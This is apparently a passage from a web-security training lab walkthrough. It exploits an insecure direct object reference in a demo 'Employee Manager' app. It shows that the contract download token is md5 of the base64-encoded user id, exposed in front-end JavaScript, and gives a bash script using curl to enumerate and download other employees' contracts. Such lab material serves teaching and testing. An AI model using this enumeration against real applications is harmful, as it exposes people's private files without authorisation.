Let's go back to the `Employee Manager` web application to test the `Contracts` functionality:
![[web_attacks_idor_contracts.jpg]]

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:
![[web_attacks_idor_download_contract.jpg]]

We see that it is sending a `POST` request to `download.php` with the following data:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

The application uses `download.php` script to avoid directly linking to files. Instead of sending the direct reference in cleartext, the application appears to be sending it in ab `md5` format.

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`, and see if it matches the above hash:
```shell-session
$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Unfortunately, the hashes don't match with the `uid` or other fields. In advanced cases, we may also utilize `Burp Comparer` and fuzz various values and then compare each to our hash to see if we find any matches. In this case, the `md5` hash could be for a unique value or a combination of values, making this direct reference a `Secure Direct Object Reference`. However, there's one fatal flaw in this web application.

## Function Disclosure

As most modern web applications are developed using JavaScript frameworks, like `Angular`, `React`, or `Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end. In this case the hash is calculated with a function on the front-end.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable. Going back to the earlier link where the function was called, we see it calling `downloadContract('1')`. So, the final value being used in the `POST` request is the `base64` encoded string of `1`, which was then `md5` hashed.

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:
```shell-session
$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

**Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

## Mass Enumeration

Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like `Burp Intruder` or `ZAP Fuzzer`.

We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows:
```shell-session
$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

With that, we can run the script, and it should download all contracts for employees 1-10:
```shell-session
$ bash ./exploit.sh
$ ls -1
